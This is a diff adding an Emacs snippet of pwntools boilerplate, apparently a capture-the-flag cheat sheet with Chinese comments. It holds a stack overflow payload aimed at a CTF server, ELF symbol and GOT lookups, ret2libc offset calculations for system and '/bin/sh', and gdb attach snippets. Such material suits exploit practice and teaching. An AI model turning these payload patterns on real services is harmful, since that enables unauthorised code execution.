@@ -1,0 +1,38 @@
+# -*- mode: snippet -*-
+# name: pwntools
+# key: 
+# --
+from pwn import *
+
+re = remote("node4.buuoj.cn",25085)
+p = process('./level1') # 用法和 remote 相同, sendline, send, interactive 等都相同
+payload = 'a' * 23 + p64(0x40118A)
+re.sendline(payload)
+re.interactive()
+# p.sendline(payload)
+
+elf = ELF('my-level3')
+elf.symbols['callsystem']
+elf = ELF('/bin/bash')
+elf.symbols['bash_license']
+elf.got['execve']
+elf.plt['execve']
+elf.functions['list_all_jobs'].address
+elf.address
+elf.bss()
+elf.entry
+
+# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+system_addr = write_addr - (libc.symbols['write'] - libc.symbols['system'])
+binsh_addr = write_addr - (libc.symbols['write'] - next(libc.search(b'/bin/sh')))
+
+# gdb
+g = gdb.debug("/bin/bash", gdbscript='continue')
+g.sendline('echo hello')
+g.recvline()
+# b'hello\n'
+g.interactive()
+
+p = process('/bin/sh') # 先启动 process
+g = gdb.attach(p, gdbscript='continue')
